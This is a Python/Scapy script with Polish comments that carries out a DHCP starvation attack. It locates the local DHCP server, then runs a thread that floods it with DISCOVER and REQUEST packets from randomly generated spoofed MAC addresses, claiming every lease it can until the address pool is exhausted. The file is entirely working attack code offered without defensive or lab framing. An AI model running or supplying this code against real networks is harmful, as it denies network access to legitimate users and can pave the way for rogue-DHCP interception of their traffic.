from scapy.all import *
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
import threading

conf.iface = conf.iface

#Mój interfejs sieciowy
eth = conf.iface
my_mac = get_if_hwaddr(eth)
my_ip = get_if_addr(eth)

#Zmienne pomocnicze
parts = my_ip.split('.')[0:3]
current_octet = 150


#Generator losowych adresów MAC
def generator():
    mac = [random.getrandbits(8) for i in range(6)]
    mac[0] = (mac[0] | 0x02) & 0xFE
    mac_string = ":".join(f'{b:02x}' for b in mac)
    return mac_string

#Funkcja odnajdująca IP serwera DHCP
def find_dhcp():
    conf.checkIPaddr = False
    pkt = Ether(src=my_mac, dst = "ff:ff:ff:ff:ff:ff") / \
          IP(src='0.0.0.0', dst='255.255.255.255') / \
          UDP(sport=68, dport=67) / \
          BOOTP(chaddr=mac2str(my_mac), flags=0x8000) / \
          DHCP(options=[('message-type', 'discover'), 'end'])
    print("Sending DHCP_DISCOVER")
    answer = srp1(pkt, iface=eth, timeout=5, verbose= False)
    if answer and answer.haslayer(DHCP):
        print("DHCP Server found")
        return answer[IP].src
    else:
        print("Server not responding")
        return None

#Zalewanie serwera DHCP losowo generowanymi adresami MAC
def dhcp_starve():
    print('Flooding thread started')
    try:
        while True:
            fake_mac = generator()
            transaction_id = random.getrandbits(32)

            print("Sending DHCP_DISCOVER")
            discover_pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                           IP(src='0.0.0.0', dst='255.255.255.255') / \
                           UDP(sport=68, dport=67) / \
                           BOOTP(chaddr=mac2str(fake_mac), xid=transaction_id) / \
                           DHCP(options=[('message-type', 'discover'), 'end'])


            offer = srp1(discover_pkt, iface=eth, timeout=2, verbose=False)

            if offer and offer.haslayer(DHCP) and offer[DHCP].options[0][1] == 2:
                offered_ip = offer[BOOTP].yiaddr
                server_id = next((opt[1] for opt in offer[DHCP].options if opt[0] == 'server_id'), None)

                print(f"DHCP_OFFER: {offered_ip} from {server_id}")
                print('Sending DHCP_REQUEST')


                request_pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                              IP(src='0.0.0.0', dst='255.255.255.255') / \
                              UDP(sport=68, dport=67) / \
                              BOOTP(chaddr=mac2str(fake_mac), xid=transaction_id) / \
                              DHCP(options=[
                                  ('message-type', 'request'),
                                  ('server_id', server_id),
                                  ('requested_addr', offered_ip),
                                  'end'
                              ])


                ack = srp1(request_pkt, iface=eth, timeout=2, verbose=False)
                if ack and ack.haslayer(DHCP) and ack[DHCP].options[0][1] == 5:
                    print(f"{offered_ip}: starved")


            time.sleep(0.05)

    except KeyboardInterrupt:
        print('Thread stopped')

if __name__ == '__main__':
    print(f'Interface: {eth}')
    print(f'IP: {my_ip}')
    dhcp_server_ip = find_dhcp()
    if dhcp_server_ip:

        starve_thread = threading.Thread(target=dhcp_starve, daemon=True)
        starve_thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print('Shutting down')